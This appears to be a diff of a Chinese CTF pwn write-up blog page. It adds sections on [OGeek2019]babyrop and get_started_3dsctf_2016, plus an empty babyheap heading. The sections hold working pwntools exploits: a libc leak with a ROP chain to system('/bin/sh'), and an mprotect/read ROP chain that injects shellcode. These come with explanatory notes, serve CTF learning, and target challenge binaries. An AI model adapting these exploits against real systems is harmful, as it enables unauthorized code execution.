@@ -26,7 +26,7 @@
     
     <div id="post-toc" class="animated hiddenToc hide">
       <span class="title">Toc</span>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn"><span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-rip"><span class="toc-text">0x01:rip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-warmup-csaw-2016"><span class="toc-text">0x02:warmup_csaw_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-pwn1-sctf-2016"><span class="toc-text">0x03:pwn1_sctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-ciscn-2019-c-1"><span class="toc-text">0x04:ciscn_2019_c_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-ciscn-2019-n-1"><span class="toc-text">0x05:ciscn_2019_n_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-ciscn-2019-en-2"><span class="toc-text">0x06:ciscn_2019_en_2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-ciscn-2019-n-8"><span class="toc-text">0x07:ciscn_2019_n_8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-ciscn-s-3"><span class="toc-text">0x08:ciscn_s_3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-ciscn-2019-n-3"><span class="toc-text">0x09:ciscn_2019_n_3</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn"><span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-rip"><span class="toc-text">0x01:rip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-warmup-csaw-2016"><span class="toc-text">0x02:warmup_csaw_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-pwn1-sctf-2016"><span class="toc-text">0x03:pwn1_sctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-ciscn-2019-c-1"><span class="toc-text">0x04:ciscn_2019_c_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-ciscn-2019-n-1"><span class="toc-text">0x05:ciscn_2019_n_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-ciscn-2019-en-2"><span class="toc-text">0x06:ciscn_2019_en_2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-ciscn-2019-n-8"><span class="toc-text">0x07:ciscn_2019_n_8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-ciscn-s-3"><span class="toc-text">0x08:ciscn_s_3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-ciscn-2019-n-3"><span class="toc-text">0x09:ciscn_2019_n_3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0A-OGeek2019-babyrop"><span class="toc-text">0x0A:[OGeek2019]babyrop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0B-get-started-3dsctf-2016"><span class="toc-text">0x0B:get_started_3dsctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0C-babyheap-0ctf-2017"><span class="toc-text">0x0C:babyheap_0ctf_2017</span></a></li></ol></li></ol>
     </div>
     
     <div id="fixed-menu-wrap">
@@ -381,7 +381,123 @@ free(<span class="hljs-number">1</span>)
 gdb.attach(p)
 p.interactive()</code></pre>
 
+<h2 id="0x0A-OGeek2019-babyrop">0x0A:[OGeek2019]babyrop<a class="post-anchor" href="#0x0A-OGeek2019-babyrop"></a></h2><pre><code class="hljs cpp"><span class="hljs-keyword">int</span> __<span class="hljs-function">cdecl <span class="hljs-title">main</span><span class="hljs-params">()</span>
+</span>&#123;
+  <span class="hljs-keyword">int</span> buf; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span>
+  <span class="hljs-keyword">char</span> v2; <span class="hljs-comment">// [esp+Bh] [ebp-Dh]</span>
+  <span class="hljs-keyword">int</span> fd; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span>
 
+  sub_80486BB();
+  fd = open(<span class="hljs-string">"/dev/urandom"</span>, <span class="hljs-number">0</span>);
+  <span class="hljs-keyword">if</span> ( fd &gt; <span class="hljs-number">0</span> )
+    read(fd, &amp;buf, <span class="hljs-number">4u</span>);
+  v2 = sub_804871F(buf);
+  sub_80487D0(v2);
+  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</code></pre>
+
+<p>使用 \x00 截断 strncmp</p>
+<pre><code class="hljs cpp"><span class="hljs-keyword">int</span> __<span class="hljs-function">cdecl <span class="hljs-title">sub_804871F</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1)</span>
+</span>&#123;
+  <span class="hljs-keyword">size_t</span> v1; <span class="hljs-comment">// eax</span>
+  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [esp+Ch] [ebp-4Ch]</span>
+  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">7</span>]; <span class="hljs-comment">// [esp+2Ch] [ebp-2Ch]</span>
+  <span class="hljs-keyword">unsigned</span> __int8 v5; <span class="hljs-comment">// [esp+33h] [ebp-25h]</span>
+  <span class="hljs-keyword">ssize_t</span> v6; <span class="hljs-comment">// [esp+4Ch] [ebp-Ch]</span>
+
+  <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>u);
+  <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>u);
+  <span class="hljs-built_in">sprintf</span>(&amp;s, <span class="hljs-string">"%ld"</span>, a1);
+  v6 = read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x20</span>u);
+  buf[v6 - <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;
+  v1 = <span class="hljs-built_in">strlen</span>(buf);
+  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strncmp</span>(buf, &amp;s, v1) )
+    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
+  write(<span class="hljs-number">1</span>, <span class="hljs-string">"Correct\n"</span>, <span class="hljs-number">8u</span>);
+  <span class="hljs-keyword">return</span> v5;
+&#125;</code></pre>
+
+<p>然后就是正常的rop</p>
+<pre><code class="hljs python">main = <span class="hljs-number">0x8048825</span>
+payload= <span class="hljs-string">'\x00'</span> + <span class="hljs-string">'\xff'</span>*<span class="hljs-number">7</span>
+p.sendline(payload)
+
+p.recvuntil(<span class="hljs-string">"Correct\n"</span>)
+payload = <span class="hljs-string">"a"</span>*<span class="hljs-number">0xe7</span> + <span class="hljs-string">'bbbb'</span>
+payload += p32(elf.plt[<span class="hljs-string">'puts'</span>])+p32(main)+p32(elf.got[<span class="hljs-string">'puts'</span>])
+p.sendline(payload)
+
+libc.address = u32(p.recv(<span class="hljs-number">4</span>).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">"\x00"</span>))-libc.symbols[<span class="hljs-string">'puts'</span>]
+ls(<span class="hljs-string">"libc addr"</span>,libc.address)
+
+payload= <span class="hljs-string">'\x00'</span> + <span class="hljs-string">'\xff'</span>*<span class="hljs-number">7</span>
+p.sendline(payload)
+
+p.recvuntil(<span class="hljs-string">"Correct\n"</span>)
+payload = <span class="hljs-string">"a"</span>*<span class="hljs-number">0xe7</span> + <span class="hljs-string">'bbbb'</span>
+payload += p32(libc.symbols[<span class="hljs-string">'system'</span>])+p32(<span class="hljs-number">0x11</span>)+p32(libc.search(<span class="hljs-string">"/bin/sh\x00"</span>).next())
+p.sendline(payload)
+<span class="hljs-comment"># gdb.attach(p)</span>
+<span class="hljs-comment"># p.sendline("cat flag &gt;&amp;0")</span>
+p.interactive()</code></pre>
+
+<h2 id="0x0B-get-started-3dsctf-2016">0x0B:get_started_3dsctf_2016<a class="post-anchor" href="#0x0B-get-started-3dsctf-2016"></a></h2><pre><code class="hljs python">pop3_ret = <span class="hljs-number">0x804951D</span>
+<span class="hljs-string">'''
+pop esi
+pop edi
+pop ebp
+'''</span>
+mem_addr = <span class="hljs-number">0x80EB000</span> <span class="hljs-comment">#可读可写的内存,但不可执行</span>
+mem_size = <span class="hljs-number">0x1000</span>    <span class="hljs-comment">#通过调试出来的值</span>
+mem_proc = <span class="hljs-number">0x7</span>       <span class="hljs-comment">#可代表可读可写可执行</span>
+
+mprotect_addr = elf.symbols[<span class="hljs-string">'mprotect'</span>]
+read_addr = elf.symbols[<span class="hljs-string">'read'</span>]
+
+<span class="hljs-string">'''
+为了连续在堆栈中执行,就是用pop3_ret来控制esp,使它往下弹掉已用的3个值.
+
+'''</span>
+payload_01 = <span class="hljs-string">'A'</span> * <span class="hljs-number">0x38</span>
+payload_01 += p32(mprotect_addr)
+payload_01 += p32(pop3_ret) <span class="hljs-comment">#执行完mprotect的返回地址,使esp往下+12</span>
+
+<span class="hljs-comment">#mprotect 的三个参数</span>
+payload_01 += p32(mem_addr)   <span class="hljs-comment">#mprotect函数参数1 修改的内存地址</span>
+payload_01 += p32(mem_size)   <span class="hljs-comment">#mprotect函数参数2 修改的内存大小</span>
+payload_01 += p32(mem_proc)   <span class="hljs-comment">#mprotect函数参数3 修改的权限</span>
+
+payload_01 += p32(read_addr) <span class="hljs-comment">#执行完pop3_ret后弹到read地址</span>
+
+payload_01 += p32(pop3_ret)  <span class="hljs-comment">#执行完read后将返回到pop3_ret指令,又继续使esp+12</span>
+
+<span class="hljs-comment">#read 的三个参数</span>
+payload_01 += p32(<span class="hljs-number">0</span>)     <span class="hljs-comment">#read函数参数1 ,从输入端读取</span>
+payload_01 += p32(mem_addr)   <span class="hljs-comment">#读取到的内容复制到指向的内存里</span>
+payload_01 += p32(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#读取大小</span>
+
+payload_01 += p32(mem_addr)   <span class="hljs-comment">#执行完read后ret esi</span>
+
+p.sendline(payload_01)
+payload_sh = asm(shellcraft.sh(),arch = <span class="hljs-string">'i386'</span>, os = <span class="hljs-string">'linux'</span>) 
+p.sendline(payload_sh)</code></pre>
+
+<p><a href="https://www.cnblogs.com/lyxf/p/12113401.html" target="_blank" rel="noopener">传送门</a></p>
+<p>内存的权限修改</p>
+<blockquote>
+<p>1.栈溢出ret 到 mprotect函数地址,我来解释一下 call 指令, call = push + jmp<br>所以直接ret后要留一个返回地址,因为ret 就相当于 jmp 到 mprotect,为了完整的回来,所以在<br>mprotect地址后在压入一个返回地址.<br>2.在32为系统中传参是使用栈传参,择第一个参数先push,第二个再push….<br>所以基本的payload可以构思如下:<br>payload = ‘A’ + 0x38 + p32(mprotect_addr)<br>payload += p32(ret_addr) + p32(argu1) + p32(argu2) +p32 (argu3)</p>
+<p>这里的mprotect_addr就是我们要跳转到mprotect函数的地址<br>ret_addr 为 mprotect函数执行完后的地址.<br>argu1 为mprotect函数的第一个参数 (被修改内存的地址) 设置为 0x0x80EB000 (edb-debuger查看得到)<br>argu2 为mprotect函数的第二个参数 (被修改内存的大小) 设置为 0x1000 (0x1000通过程序启动时查看该内存块的大小的到的)<br>argu3 为mprotect函数的第三个参数 (被修改内存的权限) 设置为 7 = 4 + 2 +1 (rwx)</p>
+<p>为了后续再能使用栈ret,我们的构造一下栈的布局,因为mprotect函数使用到了3个参数,我们就找存在3个连续pop的指令<br>为啥要找3个pop,也就是在正常情况下,函数传参是使用push，所以要为了堆栈还原,函数调用结束时就使用pop来保证堆栈<br>完好.</p>
+<p>使用 ROPgadget –binary get_started_3dsctf_2016 –only ‘pop|ret’ | grep pop<br>存在pop的一些指令地址,可以发现:<br>0x0804f460 : pop ebx ; pop esi ; pop ebp ; ret<br>那我们就得到了该地址.<br>上面的ret_addr就填写0x0804f460<br>而现在的payload就可以为:<br>payload = ‘A’ + 0x38 + p32(mprotect_addr)<br>payload += p32(pop3_addr) + p32(mem_addr) + p32(mem_size) +p32 (mem_proc)<br>payload += p32(ret_addr2)</p>
+<p>ret_addr2 即为执行完mprotect函数即弹出栈后的返回地址.我们也就可以再次利用栈的ret来控制eip,<br>即为下一个函数read的地址.</p>
+</blockquote>
+<p>内存写入shellcode</p>
+<blockquote>
+<p>read函数原型:<br>ssize_t read(int fd, void *buf, size_t count);<br>fd 设为0时就可以从输入端读取内容    设为0<br>buf 设为我们想要执行的内存地址     设为我们已找到的内存地址0x80EB000<br>size 适当大小就可以              设为0x100就可以了</p>
+<p>现在的payload也就可以构造如下<br>payload = ‘A’ + 0x38 + p32(mprotect_addr)<br>payload += p32(pop3_addr) + p32(mem_addr) + p32(mem_size) +p32 (mem_proc)<br>payload += p32(read_addr) + p32(ret_addr2) + p32(0x0) + p32(mem_addr) +p32 (0x100)<br>read函数也跟mprotect一样的例子,就是 call = push + jmp.<br>read_addr 后面的一个ret_addr2就是执行完read函数后的返回地址.再次使用pop3_ret弹掉3个已用的参数,接着还可<br>以利用栈ret来控制eip跳转到mem_addr执行自己的shellcode, payload如下.</p>
+<p>payload = ‘A’ + 0x38 + p32(mprotect_addr)<br>payload += p32(pop3_addr) + p32(mem_addr) + p32(mem_size) +p32 (mem_proc)<br>payload += p32(read_addr) + p32(ret_addr2) + p32(0x0) + p32(mem_addr) +p32 (0x100)<br>payload += p32(mem_addr)</p>
+<p>然而在执行read函数时就可以输入shellcode,即payload2为:<br>payload_sh = asm(shellcraft.sh(),arch = ‘i386’, os = ‘linux’)</p>
+</blockquote>
+<h2 id="0x0C-babyheap-0ctf-2017">0x0C:babyheap_0ctf_2017<a class="post-anchor" href="#0x0C-babyheap-0ctf-2017"></a></h2>
 
   
     <div class="post-reward">
